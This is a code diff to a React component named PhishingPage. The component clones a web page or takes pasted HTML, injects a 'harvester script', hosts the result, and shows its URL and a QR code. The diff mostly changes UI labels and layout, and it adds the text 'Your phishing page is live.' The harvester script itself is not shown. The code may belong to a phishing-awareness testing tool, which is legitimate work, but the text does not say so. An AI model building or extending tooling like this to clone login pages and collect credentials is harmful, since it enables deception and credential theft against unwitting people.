@@ -218,9 +218,9 @@ export default function PhishingPage() {
       // Inject <base> tag to fix relative links
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
-          html = html.replace(/<head>/i, \`<head>\\n<base href="${baseHrefUrl}">\`);
+          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
         } else {
-          html = \`<head><base href="${baseHrefUrl}"></head>\${html}\`;
+          html = `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
       }
 
@@ -244,7 +244,6 @@ export default function PhishingPage() {
   const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
-    setHostedUrl(null);
     
     try {
         const { url: relativeUrl } = await hostTestPage(modifiedHtml);
@@ -339,7 +338,7 @@ export default function PhishingPage() {
         <div className="flex flex-col gap-6">
             <Card>
                 <CardHeader>
-                <CardTitle>1. Page Cloner</CardTitle>
+                <CardTitle>Page Cloner & Harvester Setup</CardTitle>
                 <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                 </CardHeader>
                 <Form {...form}>
@@ -401,7 +400,7 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">2. Generate & Save</CardTitle>
+                        <CardTitle className="text-xl">Generate & Save</CardTitle>
                         <div className="w-full flex gap-2">
                             <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                 {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
@@ -436,22 +435,23 @@ export default function PhishingPage() {
             </Card>
           
           {hostedUrl && (
-             <div className="grid md:grid-cols-2 gap-4">
-                <Card>
-                    <CardHeader>
-                        <CardTitle>Hosted Page URL</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                        <div className="flex w-full items-center gap-2">
-                            <Input readOnly value={hostedUrl} className="font-mono" />
-                            <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
-                                <Clipboard className="h-4 w-4" />
-                            </Button>
-                        </div>
-                    </CardContent>
-                </Card>
-                <QrCodeGenerator url={hostedUrl} />
-             </div>
+             <Card>
+               <CardHeader>
+                 <CardTitle>Hosted Page URL</CardTitle>
+                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
+               </CardHeader>
+               <CardContent className="space-y-4">
+                 <div className="flex w-full items-center gap-2">
+                   <Input readOnly value={hostedUrl} className="font-mono" />
+                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
+                     <Clipboard className="h-4 w-4" />
+                   </Button>
+                 </div>
+                 <div className="flex justify-center">
+                   <QrCodeGenerator url={hostedUrl} />
+                 </div>
+               </CardContent>
+             </Card>
            )}
 
             <Card>
@@ -502,3 +502,5 @@ export default function PhishingPage() {
     </div>
   );
 }
+
+    
